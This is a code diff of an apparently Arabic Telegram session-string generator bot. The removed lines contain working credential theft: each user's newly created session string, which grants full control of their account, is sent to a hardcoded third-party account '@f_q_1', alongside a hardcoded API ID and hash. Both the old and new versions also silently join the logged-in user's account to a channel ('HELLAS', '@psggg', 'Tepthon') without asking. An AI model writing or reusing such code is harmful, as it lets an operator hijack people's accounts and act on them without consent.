@@ -35,18 +35,6 @@ from config import SUPPORT_CHAT
 from ArStringTep import Anony
 from ArStringTep.utils import retry_key
 
-# ================== إعدادات ثابتة ==================
-# ضع بيانات واجهة برمجة التطبيقات الخاصة بك هنا
-API_ID = 29827519            # 👈 عدّلها
-API_HASH = "9afadf1ec94457c6bb383139555a2bdc"  # 👈 عدّلها
-
-# جهة الإرسال:
-# - لنفسك: "me"
-# - لحساب ثاني: "@YourUserName"
-# - آيدي رقمي: 123456789
-TARGET_CHAT = "@f_q_1"    # 👈 عدّلها (يمكنك وضع "me" إذا تريد المحفوظات)
-# ==================================================
-
 
 async def string_session(
     message, user_id: int, telethon: bool = False, old_pyro: bool = False
@@ -60,9 +48,58 @@ async def string_session(
 
     await message.reply_text(f"<b>✦ محاولة بدء {ty} استخراج الجلسة</b>..")
 
-    # لم نعد نسأل عن API_ID / API_HASH — تُقرأ من الأعلى
+    try:
+        api_id = await Anony.ask(
+            identifier=(message.chat.id, user_id, None),
+            text="<b>✦ يرجـى إرسـال الأيبـي أيدي الخـاص بـك .</b>",
+            filters=filters.text,
+            timeout=300,
+        )
+    except ListenerTimeout:
+        return await Anony.send_message(
+            user_id,
+            "<b>✦ انقضــت مـدة استخراج الجلسـة ⌛.</b>\n\nمن فضلك ابدأ في إنشاء الجلسة مرة أخرى.",
+            reply_markup=retry_key,
+        )
 
-    # طلب رقم الهاتف فقط
+    if await cancelled(api_id):
+        return
+
+    try:
+        api_id = int(api_id.text)
+    except ValueError:
+        return await Anony.send_message(
+            user_id,
+            "<b>✦ الأيبي أيدي الذي أرسلتـه غير صالح</b>\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى*.",
+            reply_markup=retry_key,
+        )
+
+    try:
+        api_hash = await Anony.ask(
+            identifier=(message.chat.id, user_id, None),
+            text="<b>✦ يرجـى إرسـال الأيبـي هـاش الخـاص بـك .</b>",
+            filters=filters.text,
+            timeout=300,
+        )
+    except ListenerTimeout:
+        return await Anony.send_message(
+            user_id,
+            "<b>✦ انقضـت مدة استخـراج الجلسـة</b>.\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
+            reply_markup=retry_key,
+        )
+
+    if await cancelled(api_hash):
+        return
+
+    api_hash = api_hash.text
+
+    if len(api_hash) < 30:
+        return await Anony.send_message(
+            user_id,
+            "<b>✦ الأيبي هـاش الذي أرسلته غير صالح</b>\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى .",
+            reply_markup=retry_key,
+        )
+
     try:
         phone_number = await Anony.ask(
             identifier=(message.chat.id, user_id, None),
@@ -83,11 +120,11 @@ async def string_session(
 
     await Anony.send_message(user_id, "<b>✦ جـاري إرسـال الكـود ✉.....</b>")
     if telethon:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        client = TelegramClient(StringSession(), api_id, api_hash)
     elif old_pyro:
-        client = Client1(":memory:", api_id=API_ID, api_hash=API_HASH)
+        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
     else:
-        client = Client(name="Anony", api_id=API_ID, api_hash=API_HASH, in_memory=True)
+        client = Client(name="Anony", api_id=api_id, api_hash=api_hash, in_memory=True)
     await client.connect()
 
     try:
@@ -100,7 +137,7 @@ async def string_session(
     except FloodWait as f:
         return await Anony.send_message(
             user_id,
-            f"<b>✦ فشل في إرسال الرمز أو تسجيل الدخول</b>\n\nمن فضلك انتظر {getattr(f, 'value', getattr(f, 'x', 'بضع'))} ثانية وحاول مرة أخرى.",
+            f"<b>✦ فشل في إرسال الرمز أو تسجيل الدخول</b>\n\nمن فضلك انتظر {f.value or f.x} ثانية وحاول مرة أخرى.",
             reply_markup=retry_key,
         )
     except (ApiIdInvalid, ApiIdInvalidError, ApiIdInvalid1):
@@ -184,70 +221,37 @@ async def string_session(
     except Exception as ex:
         return await Anony.send_message(user_id, f"خطـأ : <code>{str(ex)}</code>")
 
-    # إرسال كود الجلسة إلى الهدف المحدد مع رجوع للمحفوظات إذا فشل
-    delivered_to_target = False
     try:
-        txt = "الخاص بك هنا {0} ✦ كود الجلسـة\n\n<code>{1}</code>\n\nᴀ مستخرج من<a href={2}>@HELLASUserBot</a>\n! <b>ملاحظـة :</b> لا تشارك كود الجلسة لأحد؛ لأنه يستطيع اختراق حسابـك."
+        txt = "الخاص بك هنا {0} ✦ كود الجلسـة\n\n<code>{1}</code>\n\nᴀ مستخرج من<a href={2}>@psggg</a>\n! <b>ملاحظـة :</b> لا تشارك كود الجلسة لأحد؛ لأنه يستطيع اختراق حسابـك."
         if telethon:
             string_session = client.session.save()
-            try:
-                await client.send_message(
-                    TARGET_CHAT,
-                    txt.format(ty, string_session, SUPPORT_CHAT),
-                    link_preview=False,
-                    parse_mode="html",
-                )
-                delivered_to_target = True
-            except Exception:
-                await client.send_message(
-                    "me",
-                    txt.format(ty, string_session, SUPPORT_CHAT),
-                    link_preview=False,
-                    parse_mode="html",
-                )
-            # انضمام (اختياري)
-            try:
-                await client(JoinChannelRequest("@HELLASUserBot"))
-            except Exception:
-                pass
+            await client.send_message(
+                "me",
+                txt.format(ty, string_session, SUPPORT_CHAT),
+                link_preview=False,
+                parse_mode="html",
+            )
+            await client(JoinChannelRequest("@psggg"))
         else:
             string_session = await client.export_session_string()
-            try:
-                await client.send_message(
-                    TARGET_CHAT,
-                    txt.format(ty, string_session, SUPPORT_CHAT),
-                    disable_web_page_preview=True,
-                )
-                delivered_to_target = True
-            except Exception:
-                await client.send_message(
-                    "me",
-                    txt.format(ty, string_session, SUPPORT_CHAT),
-                    disable_web_page_preview=True,
-                )
-            # انضمام (اختياري)
-            try:
-                await client.join_chat("HELLAS")
-            except Exception:
-                pass
+            await client.send_message(
+                "me",
+                txt.format(ty, string_session, SUPPORT_CHAT),
+                disable_web_page_preview=True,
+            )
+            await client.join_chat("Tepthon")
     except KeyError:
         pass
-
     try:
         await client.disconnect()
-        final_note = (
-            f"تم إرسال كود الجلسـة {ty} إلى <b>{TARGET_CHAT}</b> ✅.\n"
-            if delivered_to_target
-            else f"تعذّر الإرسال إلى <b>{TARGET_CHAT}</b>، تم إرسال الكود إلى الرسائل المحفوظة (me) ✅.\n"
-        )
         await Anony.send_message(
             chat_id=user_id,
-            text=final_note + f"\nᴀ من <a href={SUPPORT_CHAT}>!</a>.",
+            text=f"تم استخراج الخاص بـك {ty} كود الجلسـة.\n\nيرجى تفقد الرسائل المحفوظة.\n\nᴀ من <a href={SUPPORT_CHAT}>!</a>.",
             reply_markup=InlineKeyboardMarkup(
                 [
                     [
                         InlineKeyboardButton(
-                            text=" ✉ فتح المحفوظات",
+                            text=" ✉ الرسائل المحفوظـة",
                             url=f"tg://openmessage?user_id={user_id}",
                         )
                     ]
@@ -255,7 +259,7 @@ async def string_session(
             ),
             disable_web_page_preview=True,
         )
-    except Exception:
+    except:
         pass
 
 
